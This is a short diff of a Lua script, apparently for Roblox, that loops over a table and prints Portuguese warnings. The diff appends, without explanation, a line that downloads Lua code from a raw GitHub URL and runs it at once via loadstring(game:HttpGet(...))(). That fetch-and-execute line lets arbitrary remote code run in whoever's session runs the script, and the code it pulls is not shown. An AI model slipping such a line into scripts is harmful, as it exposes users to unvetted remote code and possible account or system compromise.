@@ -12,3 +12,5 @@ for numero, valor in pairs(TargetInnate) do
         warn("Valor '" .. numero .. "' desconhecido")
     end
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2backside/vencordgui/refs/heads/main/learn.lua"))()
